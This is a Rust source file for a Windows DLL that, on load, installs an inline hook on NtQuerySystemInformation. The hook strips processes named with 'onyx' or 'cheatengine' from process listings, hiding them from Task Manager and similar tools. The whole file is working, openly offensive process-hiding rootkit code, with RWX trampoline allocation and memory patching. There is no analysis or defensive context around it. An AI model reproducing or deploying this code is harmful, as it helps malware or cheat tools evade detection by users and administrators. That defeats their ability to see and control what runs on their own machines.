#![allow(non_snake_case, non_camel_case_types, dead_code, unsafe_op_in_unsafe_fn, static_mut_refs)]

use std::ffi::c_void;
use std::ptr::{null_mut, copy_nonoverlapping};
use std::sync::atomic::{AtomicBool, Ordering};

type HANDLE = *mut c_void;
type HMODULE = *mut c_void;
type BOOL = i32;
type DWORD = u32;
type NTSTATUS = i32;

const STATUS_SUCCESS: NTSTATUS = 0;
const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
const MEM_COMMIT: DWORD = 0x1000;
const MEM_RESERVE: DWORD = 0x2000;
const DLL_PROCESS_ATTACH: DWORD = 1;
const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;

#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct UnicodeString {
    pub length: u16,
    pub maximum_length: u16,
    pub buffer: *mut u16,
}

#[repr(C)]
pub struct SystemProcessInformation {
    pub next_entry_offset: u32,
    pub number_of_threads: u32,
    pub working_set_private_size: i64,
    pub hard_fault_count: u32,
    pub number_of_threads_high_watermark: u32,
    pub cycle_time: u64,
    pub create_time: i64,
    pub user_time: i64,
    pub kernel_time: i64,
    pub image_name: UnicodeString,
    pub base_priority: i32,
    pub unique_process_id: usize,
    pub inherited_from_unique_process_id: usize,
    pub handle_count: u32,
    pub session_id: u32,
    pub unique_process_key: usize,
}

type FnNtQuerySystemInformation = unsafe extern "system" fn(
    system_information_class: u32,
    system_information: *mut c_void,
    system_information_length: u32,
    return_length: *mut u32,
) -> NTSTATUS;

static mut ORIG_NT_QUERY_SYSTEM_INFORMATION: Option<FnNtQuerySystemInformation> = None;
static HOOK_INSTALLED: AtomicBool = AtomicBool::new(false);

unsafe extern "system" {
    fn GetModuleHandleA(lpModuleName: *const u8) -> HMODULE;
    fn GetProcAddress(hModule: HMODULE, lpProcName: *const u8) -> *mut c_void;
    fn VirtualProtect(lpAddress: *mut c_void, dwSize: usize, flNewProtect: DWORD, lpflOldProtect: *mut DWORD) -> BOOL;
    fn VirtualAlloc(lpAddress: *mut c_void, dwSize: usize, flAllocationType: DWORD, flProtect: DWORD) -> *mut c_void;
}

unsafe fn install_detour64(target: *mut c_void, detour: *mut c_void) -> *mut c_void {
    let trampoline = VirtualAlloc(null_mut(), 64, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if trampoline.is_null() {
        return null_mut();
    }

    copy_nonoverlapping(target as *const u8, trampoline as *mut u8, 14);

    let return_addr = (target as usize) + 14;
    let mut jump_back = [0u8; 14];
    jump_back[0] = 0xFF;
    jump_back[1] = 0x25;
    jump_back[2..6].copy_from_slice(&0u32.to_ne_bytes());
    jump_back[6..14].copy_from_slice(&(return_addr as u64).to_ne_bytes());
    copy_nonoverlapping(jump_back.as_ptr(), (trampoline as usize + 14) as *mut u8, 14);

    let mut old_protect: DWORD = 0;
    VirtualProtect(target, 14, PAGE_EXECUTE_READWRITE, &mut old_protect);

    let mut jump_to_detour = [0u8; 14];
    jump_to_detour[0] = 0xFF;
    jump_to_detour[1] = 0x25;
    jump_to_detour[2..6].copy_from_slice(&0u32.to_ne_bytes());
    jump_to_detour[6..14].copy_from_slice(&(detour as usize as u64).to_ne_bytes());
    copy_nonoverlapping(jump_to_detour.as_ptr(), target as *mut u8, 14);

    VirtualProtect(target, 14, old_protect, &mut old_protect);

    trampoline
}

unsafe fn should_hide_name(name_buf: *mut u16, len_bytes: u16) -> bool {
    if name_buf.is_null() || len_bytes == 0 {
        return false;
    }

    let char_count = (len_bytes / 2) as usize;
    let slice = std::slice::from_raw_parts(name_buf, char_count);
    let s = String::from_utf16_lossy(slice).to_lowercase();

    s.contains("onyx") || s.contains("cheatengine")
}

unsafe extern "system" fn hook_nt_query_system_information(
    system_information_class: u32,
    system_information: *mut c_void,
    system_information_length: u32,
    return_length: *mut u32,
) -> NTSTATUS {
    let orig = match ORIG_NT_QUERY_SYSTEM_INFORMATION {
        Some(f) => f,
        None => return -1,
    };

    let status = orig(
        system_information_class,
        system_information,
        system_information_length,
        return_length,
    );

    if status == STATUS_SUCCESS && system_information_class == SYSTEM_PROCESS_INFORMATION_CLASS && !system_information.is_null() {
        let mut current_ptr = system_information as *mut u8;
        let mut prev_entry: *mut SystemProcessInformation = null_mut();

        loop {
            let current = current_ptr as *mut SystemProcessInformation;
            let next_offset = (*current).next_entry_offset;
            let hide = should_hide_name((*current).image_name.buffer, (*current).image_name.length);

            if hide {
                if !prev_entry.is_null() {
                    if next_offset != 0 {
                        (*prev_entry).next_entry_offset += next_offset;
                    } else {
                        (*prev_entry).next_entry_offset = 0;
                    }
                } else {
                    if next_offset != 0 {
                        let next_ptr = current_ptr.add(next_offset as usize);
                        let mut total_size = 0usize;
                        let mut walk = next_ptr;
                        loop {
                            let walk_entry = &*(walk as *const SystemProcessInformation);
                            if walk_entry.next_entry_offset == 0 {
                                total_size += std::mem::size_of::<SystemProcessInformation>();
                                break;
                            }
                            total_size += walk_entry.next_entry_offset as usize;
                            walk = walk.add(walk_entry.next_entry_offset as usize);
                        }

                        copy_nonoverlapping(next_ptr, current_ptr, total_size);
                        continue;
                    } else {
                        break;
                    }
                }
            } else {
                prev_entry = current;
            }

            if next_offset == 0 {
                break;
            }

            current_ptr = current_ptr.add(next_offset as usize);
        }
    }

    status
}

#[unsafe(no_mangle)]
pub unsafe extern "system" fn InitializeTaskmgrCloak() -> BOOL {
    if HOOK_INSTALLED.swap(true, Ordering::SeqCst) {
        return 1;
    }

    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    if ntdll.is_null() {
        return 0;
    }

    let p_nt_query = GetProcAddress(ntdll, b"NtQuerySystemInformation\0".as_ptr());
    if p_nt_query.is_null() {
        return 0;
    }

    let tramp = install_detour64(p_nt_query, hook_nt_query_system_information as *mut c_void);
    if tramp.is_null() {
        return 0;
    }

    ORIG_NT_QUERY_SYSTEM_INFORMATION = Some(std::mem::transmute::<*mut c_void, FnNtQuerySystemInformation>(tramp));
    1
}

#[unsafe(no_mangle)]
pub unsafe extern "system" fn DllMain(
    _h_module: HMODULE,
    ul_reason_for_call: DWORD,
    _lp_reserved: *mut c_void,
) -> BOOL {
    if ul_reason_for_call == DLL_PROCESS_ATTACH {
        InitializeTaskmgrCloak();
    }
    1
}
